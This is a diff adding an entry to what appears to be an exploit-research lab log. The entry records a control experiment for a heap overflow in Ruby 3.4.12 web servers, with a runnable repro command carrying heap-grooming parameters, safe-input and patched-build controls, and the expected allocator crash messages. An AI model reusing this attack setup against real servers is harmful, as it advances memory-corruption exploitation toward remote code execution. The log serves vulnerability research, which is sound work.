@@ -17224,3 +17224,34 @@ GC-read `+9`, four malformed at `+8`, no usable field; useful target UNKNOWN.
 `git archive b3e21b50 lab/frontier/gimpjif2shell`: 16/0 rc 0, zero
 `W313 READ HIT` records, fault address another heap value rather than the
 chosen word. Witness replay of that commit is asked; verdict UNKNOWN.
+
+### W312 — production no-mtrace claim control pair (Ruby, §03:5xZ)
+
+All three arms use port base 4810, 12 fresh loopback processes each, plain
+3.4.12 unless stated, and identical forged plant/claim bodies. Raw servers
+are gitignored under `lab/build/evidence/` and regenerate with:
+
+    # attack: ß overflow, no tracer in the server environment
+    RACK_ENV=production RUBY2SHELL_CLAIM_STACK=sinatra \
+      RUBY2SHELL_CLAIM_MODE=poison RUBY2SHELL_CLAIM_N=972 \
+      RUBY2SHELL_CLAIM_TAG=w312prod400 RUBY2SHELL_CLAIM_DRAIN=984x7 \
+      RUBY2SHELL_CLAIM_PLANT=1000x6 FILLER_SPEC=1x1200 \
+      RUBY2SHELL_CLAIM_PARTS='1024@0x400:0x414,1015' \
+      RUBY2SHELL_CLAIM_COUNT=12 RUBY2SHELL_CLAIM_NO_MTRACE=1 \
+      POISON_GROWN=0x450 POISON_NEXT=0x90 \
+      bash lab/repro/ruby2shell-shrink-claim.sh
+
+    # safe input: same body length, all-ASCII _method (no multi-byte fold)
+    # — add METHOD_LEAD_A=968 and RUBY2SHELL_CLAIM_TAG=w312prod400safe
+
+    # fixed build: same attack wire on patched 3.4.13
+    # — add RUBY2SHELL_CLAIM_RB=lab/build/plain/ruby-3.4.13-plain/bin/ruby,
+    #   RUBY2SHELL_CLAIM_TAG=w312prod400fixed2; keep the default 3.4.12
+    #   GEM_PATH (ruby2shell-stock-baseline.sh:21), since the 3.4.13 gem dir
+    #   lacks sinatra 4.2.2 and boot-fails (preserved as w312prod400fixed).
+
+Expect attack 10/12 aborts (`corrupted size vs. prev_size`,
+`malloc(): unaligned tcache chunk detected`, `munmap_chunk(): invalid
+pointer`), safe 12/12 and fixed 12/12 all six requests 404 with the process
+alive and no abort line. Grade unchanged; no command or chosen-byte write.
+
